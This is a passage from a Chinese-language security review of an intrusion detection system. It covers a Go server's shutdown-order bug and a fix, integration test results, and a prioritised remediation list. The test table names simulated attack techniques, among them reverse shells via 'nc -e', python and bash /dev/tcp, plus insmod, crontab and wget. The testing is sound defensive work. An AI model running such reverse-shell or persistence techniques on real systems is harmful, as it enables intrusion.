    DATA_TYPE_SSH_BRUTE_FORCE = 6001;
    DATA_TYPE_DANGEROUS_COMMAND = 6003;
    // ...
}
```

---

### QA-03: 服务端关闭顺序存在问题

| 属性 | 值 |
|------|-----|
| **严重级别** | 中 (Medium) |
| **文件路径** | `server/cmd/main.go` |
| **行号** | 146-179 |
| **影响** | 优雅关闭时可能丢失正在处理的数据或触发 panic |

**问题代码:**

```go
go func() {
    <-sigCh
    log.Infof("收到关闭信号，正在优雅关闭...")

    // 停止漏洞匹配调度器
    if vulnScheduler != nil {
        vulnScheduler.Stop()
    }
    // 停止AI分析模块
    analysis.Stop()

    // GracefulStop 会等待所有活跃的流式 RPC handler 完成
    gracefulDone := make(chan struct{})
    go func() {
        grpcServer.GracefulStop()
        close(gracefulDone)
    }()

    select {
    case <-gracefulDone:
        log.Infof("gRPC Server 优雅关闭完成")
    case <-time.After(5 * time.Second):
        log.Warnf("gRPC 优雅关闭超时(5s)，强制关闭连接")
        grpcServer.Stop()
    }

    transferServer.Stop() // drain dispatcher + flush writers
}()
```

**问题分析:**

| 步骤 | 当前顺序 | 正确顺序 |
|------|---------|---------|
| 1 | 停止漏洞调度器 | 停止接受新 gRPC 连接 |
| 2 | 停止 AI 分析 | 等待现有 RPC handler 完成 |
| 3 | gRPC GracefulStop（等待所有流完成） | transferServer.Stop()（drain + flush） |
| 4 | transferServer.Stop() | 关闭数据库连接 |

**风险:**

1. **数据丢失**: `grpcServer.GracefulStop()` 等待期间，Transfer handler 可能还在向 `transferServer.pkgChan` 写入数据。5 秒超时后 `grpcServer.Stop()` 强制断开连接，此时 `pkgChan` 中可能还有未处理的数据
2. **顺序倒置**: `transferServer.Stop()` 在 gRPC 关闭之后执行，但理想情况下应先 drain transferServer 的 channel，确保所有数据已写入数据库，再关闭 gRPC
3. **数据库连接**: 代码中未显式关闭数据库连接（`db.Close()`），依赖进程退出时操作系统回收

**建议修复:**

```go
// 1. 先停止接受新连接
grpcServer.GracefulStop() // 或设置合理超时

// 2. drain transferServer（确保所有已收到的数据入库）
transferServer.Stop()

// 3. 停止后台服务
vulnScheduler.Stop()
analysis.Stop()

// 4. 关闭数据库连接
db.Close()
```

---

## 五、集成测试结果

审查期间对全部 10 个测试脚本进行了端到端测试验证，结果如下：

| # | 测试脚本 | 结果 | 数据库验证 |
|---|---------|------|-----------|
| 1 | test-dangerous-commands.sh | **PASS** | 4 条 eBPF 事件（insmod, iptables, crontab, wget） |
| 2 | test-privilege-escalation.sh | **PASS** | 1 条 SUID wrapper 提权告警 |
| 3 | test-reverse-shell.sh | **PASS** | 3+ 条反弹 Shell 告警（nc -e, python, bash /dev/tcp） |
| 4 | test-malicious-requests.sh | **PASS** | 3 条 DNS 规则命中（矿池/C2/钓鱼域名） |
| 5 | test-file-integrity.sh | **PASS** | 4 条文件事件（创建、重命名、删除、hosts 修改） |
| 6 | test-ssh-bruteforce.sh | **PASS** | SSH 暴力破解告警 count=6 |
| 7 | test-ftp-bruteforce.sh | **PASS** | FTP 暴力破解告警 count=6 |
| 8 | test-ssh-anomaly-login.sh | **PASS** | 1 条异常登录告警（非白名单 IP） |
| 9 | test-nids.sh | **PASS** | 14 条网络攻击告警（12 条规则 SID） |
| 10 | test-scanner.sh | **PASS** | 3 条恶意文件告警（ClamAV 检出 EICAR） |

**测试期间发现的运行时问题:**

1. **test-dangerous-commands.sh**: 脚本使用 `set -e`，`insmod /tmp/nonexistent.ko` 返回非零退出码导致脚本提前中断，但 eBPF 已捕获该事件
2. **test-nids.sh**: 首次运行时 nginx 已停止（推测被前序测试的 nc 端口冲突影响），重启 nginx 后通过
3. **test-scanner.sh**: 原始配置扫描 `/root` 目录过大（含 `.cache/JetBrains/` 约 1GB），scanner 按字母序遍历耗时过长，修改扫描路径为 `/tmp/scanner_test` 后通过

---

## 六、总结与建议

### 问题统计

| 类别 | 数量 | 严重(Critical) | 高(High) | 中(Medium) | 低(Low) |
|------|------|---------------|----------|-----------|---------|
| 安全缺陷 | 5 | 2 | 2 | 1 | 0 |
| 功能缺陷 | 7 | 0 | 2 | 3 | 2 |
| 检测能力缺失 | 6 | 0 | 2 | 4 | 0 |
| 代码质量 | 3 | 0 | 1 | 2 | 0 |
| **合计** | **21** | **2** | **7** | **10** | **2** |

### 优先修复建议

**P0 - 立即修复（生产环境部署前必须完成）:**

1. SEC-01: 启用 TLS 加密
2. SEC-02: 实现 Agent 身份认证
3. SEC-03: 消除 JWT 硬编码密钥

**P1 - 尽快修复（影响系统稳定性和检测效果）:**

4. BUG-02: NIDS tracker 内存泄漏
5. QA-01: 补充容器逃逸服务端处理
6. GAP-01: 增强反弹 Shell 检测
7. GAP-02: 扩展容器逃逸检测覆盖

**P2 - 计划修复（提升系统质量）:**

8. SEC-04: 修正 CORS 配置
9. BUG-01: Perf 事件丢失上报机制
10. BUG-03: /etc/passwd 缓存优化
11. QA-03: 服务端关闭顺序修正
12. GAP-04: 增加 IPv6 支持

**P3 - 长期改进:**

13. GAP-03: 文件写入内容监控
14. GAP-05: DoH 绕过对策
15. GAP-06: NIDS 多协议支持
16. BUG-05/QA-02: DataType 常量统一管理
17. BUG-06: bind/accept 事件处理或禁用
